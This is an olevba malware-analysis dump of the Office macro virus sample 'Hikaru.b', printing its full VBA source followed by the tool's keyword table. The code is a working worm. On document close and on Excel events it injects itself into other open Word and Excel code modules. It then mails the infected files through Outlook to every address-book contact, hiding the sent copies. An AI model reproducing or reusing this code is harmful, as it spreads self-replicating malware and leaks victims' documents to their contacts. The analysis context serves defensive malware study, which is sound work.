olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hikaru.b-f95b6bc3003cfe0d789ba25160ebb82377e8954f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hikaru.b-f95b6bc3003cfe0d789ba25160ebb82377e8954f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Copyright (C) 1998 by FlyShadow ~^^~ - Hikaru
Dim £f As String, £h As Byte
Private Sub Document_Close()
 On Error Resume Next
 £l Application.VBE: £h = 1
 £l GetObject(, "Word.Application").VBE
 £l GetObject(, "Excel.Application").VBE
 Send
End Sub
Private Sub £l(ByRef £j As Object)
 For £d = 1 To £j.CodePanes.Count
 Set £o = £j.CodePanes(£d).CodeModule
    If £o.Find("~^^~", 0, 0, 0, 0) And £h = 0 Then
        £f = £o.Lines(1, £o.CountOfLines): £h = 1: £d = 0
    End If
    If Not £o.Find("~^^~", 0, 0, 0, 0) And £h = 1 Then
        £j.CodePanes(£d).CodeModule.InsertLines 1, £f
    End If
 Next
End Sub
Private Sub Workbook_Deactivate(): Document_Close: End Sub
Private Sub UserForm_Initialize(): Document_Close: End Sub
Private Sub Worksheet_Activate(): Document_Close: End Sub
Private Sub Send()
On Error Resume Next
Set OLA = CreateObject("Outlook.Application")
For Each ALC In OLA.GetNameSpace("MAPI").AddressLists
If ALC.AddressEntries.Count <> 0 Then
Set FSS = OLA.CreateItem(0)
For FSN = 1 To ALC.AddressEntries.Count
FSS.BCC = FSS.BCC & "; " & ALC.AddressEntries(FSN).Address: Next
FSS.Subject = "Virus Alert!!!"
FSS.Body = "New O97M_Hikaru Virus." & Chr(13) & Chr(10) & "Exampler---------->"
FSS.Attachments.Add Application.ActiveWorkbook.FullName
FSS.Attachments.Add Application.ActiveDocument.FullName
FSS.DeleteAfterSubmit = 1
FSS.Send
End If: Next
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

